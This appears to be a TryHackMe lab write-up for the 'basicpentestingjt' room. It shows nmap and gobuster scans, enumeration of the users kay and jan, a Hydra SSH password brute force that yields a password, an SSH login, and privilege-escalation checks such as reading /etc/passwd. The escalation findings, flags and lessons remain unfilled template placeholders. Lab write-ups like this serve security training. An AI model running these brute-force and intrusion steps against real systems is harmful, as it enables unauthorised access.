@@ -1,0 +1,144 @@
+
+# 🛡️ TryHackMe Room Write-up Template
+
+
+# 🏠 TryHackMe Room: basicpentestingjt
+> Difficulty:Easy  
+> Category: web app hcking and Priveldge Escalation
+> Room URL: https://tryhackme.com/room/basicpentestingjt
+
+---
+
+## 🧠 Overview
+
+**Objective**:  
+  
+"In this room we need to exploit,enumerate and escalate our privileges using various tools and skills"
+
+---
+
+## 🧰 Tools Used
+
+-`nmap`
+-`gobuster`
+-`Enum4linux`
+
+---
+
+## 🌐 Enumeration
+
+### 🔍 Nmap Scan
+```
+nmap -A -sS -p- -sV -Pn -T4 10.10.212.30
+```
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 01:34 EDT
+Stats: 0:04:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 38.20% done; ETC: 01:45 (0:06:40 remaining)
+Stats: 0:06:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 64.67% done; ETC: 01:44 (0:03:40 remaining)
+Nmap scan report for 10.10.212.30
+Host is up (0.17s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 5 hops
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT       ADDRESS
+1   23.60 ms  10.17.0.1
+2   ... 4
+5   152.40 ms 10.10.212.30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 604.90 seconds
+
+```
+---
+
+## 📁 Web Enumeration
+
+### Gobuster/Dirb Scan
+
+```bash
+gobuster dir -u 10.10.212.30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+```
+
+**Interesting Findings**:
+
+* `/development`
+* `/server-status`
+---
+## Enum4linux
+" found users on the server"
+- kay
+- jan
+
+
+## 🔓 Brute forcing 
+
+### Hydra
+`hydra -l jan -P rockyou.txt ssh://10.10.212.30`
+got a password 
+- * armando*
+
+### SSh into the server
+
+`ssh jan@10.10.212.30`
+
+---
+
+## 📈 Privilege Escalation
+
+### Enumeration with LinPEAS
+
+* Use `linpeas.sh`, `sudo -l`, or manual checks:
+
+```bash
+sudo -l
+cat /etc/passwd
+```
+
+### Vulnerability Found
+
+* Misconfigured sudo
+* Cron job
+* SUID binary
+* Kernel exploit
+
+---
+
+## 🔑 Flags
+
+* `user.txt`: `THM{xxxxxxxxxxxxxxxxxxxxxxxx}`
+* `root.txt`: `THM{yyyyyyyyyyyyyyyyyyyyyyyy}`
+
+---
+
+## 💡 Lessons Learned
+
+* Key takeaways from the room.
+* New tools or techniques learned.
+* Any real-world relevance.
+
+---
+
+
+
+---
+
+## 🧠 References
+
+* [TryHackMe Room](https://tryhackme.com/room/<room-name>)
+* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+* [GTFOBins](https://gtfobins.github.io/)
+
+```
+
+
